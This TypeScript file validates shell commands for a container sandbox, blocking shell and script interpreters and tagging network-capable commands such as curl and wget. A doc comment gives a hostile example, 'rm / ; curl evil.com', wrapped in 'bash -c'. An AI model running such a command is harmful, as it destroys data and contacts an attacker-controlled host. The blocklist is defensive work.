/**
 * Shell command validation — blocklist-based.
 *
 * Container isolation (read-only rootfs, network policy, cap-drop ALL,
 * pid/mem limits) is the security boundary. The blocklist only prevents
 * shell interpreters that could bypass metacharacter validation via
 * `bash -c "..."` style invocations.
 */

import { tokenize } from './shell-tokenizer.js';

/**
 * Blocklisted shell interpreters.
 *
 * These can execute arbitrary strings (e.g. `bash -c "rm / ; curl evil.com"`),
 * bypassing the metacharacter check. All other binaries are allowed —
 * the container is the security boundary.
 */
export const SHELL_BLOCKLIST = new Set([
  'bash',
  'sh',
  'dash',
  'zsh',
  'csh',
  'tcsh',
  'ksh',
  'fish',
  // Script interpreters that accept -e/-c style inline code
  'perl',
  'ruby',
  'lua',
  'tclsh',
]);

/**
 * @deprecated Use SHELL_BLOCKLIST. Kept for backward compatibility.
 */
export const DEFAULT_ALLOWLIST = SHELL_BLOCKLIST;

/**
 * Network-capable commands (for provenance tagging).
 *
 * Commands that can make network requests should be tagged
 * with provenance='web' to indicate the data came from outside.
 */
export const NETWORK_COMMANDS = new Set(['curl', 'wget', 'git', 'npm', 'npx', 'pip', 'pip3']);

/**
 * Validation result.
 */
export interface ValidationResult {
  valid: boolean;
  reason?: string;
  commands?: string[];
  hasNetwork?: boolean;
}

/**
 * Validate a single command against the blocklist.
 *
 * @param command - Command name (without arguments)
 * @param blocklist - Set of blocked commands (defaults to SHELL_BLOCKLIST)
 * @returns Validation result
 */
export function validateCommand(
  command: string,
  blocklist: Set<string> = SHELL_BLOCKLIST
): ValidationResult {
  // Strip leading path (e.g., /usr/bin/bash -> bash)
  const baseCommand = command.split('/').pop() ?? command;

  if (blocklist.has(baseCommand)) {
    return {
      valid: false,
      reason: `Shell interpreter not allowed: ${baseCommand}. Use commands directly instead of wrapping in ${baseCommand} -c.`,
    };
  }

  return { valid: true };
}

/**
 * Check if a command is a network command.
 *
 * @param command - Command name
 * @returns True if the command can make network requests
 */
export function isNetworkCommand(command: string): boolean {
  const baseCommand = command.split('/').pop() ?? command;
  return NETWORK_COMMANDS.has(baseCommand);
}

/**
 * Validate a pipeline of commands (e.g., "cat file | grep pattern").
 *
 * Each command in the pipeline is checked against the blocklist.
 * Uses quote-aware tokenizer so that `|` inside quotes is not treated as a pipe.
 *
 * @param pipeline - Full command string with optional pipes
 * @param blocklist - Set of blocked commands (defaults to SHELL_BLOCKLIST)
 * @returns Validation result
 */
export function validatePipeline(
  pipeline: string,
  blocklist: Set<string> = SHELL_BLOCKLIST
): ValidationResult {
  const { segments } = tokenize(pipeline);

  if (segments.length === 0) {
    return { valid: false, reason: 'Malformed command (unterminated quote)' };
  }

  // Validate each segment's first token against blocklist
  const commandNames: string[] = [];
  for (const tokens of segments) {
    const commandName = tokens[0];

    if (!commandName) {
      return { valid: false, reason: 'Empty command in pipeline' };
    }

    const result = validateCommand(commandName, blocklist);
    if (!result.valid) {
      return result;
    }

    commandNames.push(commandName);
  }

  // Check if any command is a network command
  const hasNetwork = commandNames.some((c) => isNetworkCommand(c));

  return {
    valid: true,
    commands: commandNames,
    hasNetwork,
  };
}

/**
 * @deprecated No longer needed — blocklist model allows all non-interpreter commands.
 */
export function createAllowlist(commands: string[]): Set<string> {
  return new Set(commands);
}
